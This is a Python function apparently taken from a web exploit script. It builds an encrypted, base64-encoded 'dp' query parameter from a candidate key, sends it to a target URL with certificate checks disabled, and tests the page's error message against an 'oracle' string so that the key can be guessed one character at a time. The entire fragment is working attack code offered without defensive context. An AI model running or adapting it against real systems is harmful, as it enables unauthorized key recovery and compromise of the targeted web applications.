def get_result(plaintext, key, session, pad_chars):
    global requests_sent, char_requests

    url = args.url
    base_pad = (len(key) % 4)
    base = '' if base_pad == 0 else pad_chars[0:4 - base_pad]
    dp_encrypted = base64.b64encode(
                                (encrypt(plaintext, key) + base).encode()
                            ).decode()
    request = requests.Request('GET', url + '?dp=' + dp_encrypted)
    request = request.prepare()
    response = session.send(request, verify=False, proxies = getProxy(args.proxy))
    requests_sent += 1
    char_requests += 1

    match = re.search("(Error Message:)(.+\n*.+)(</div>)", response.text)
    return True \
        if match is not None \
        and match.group(2) == args.oracle \
        else False
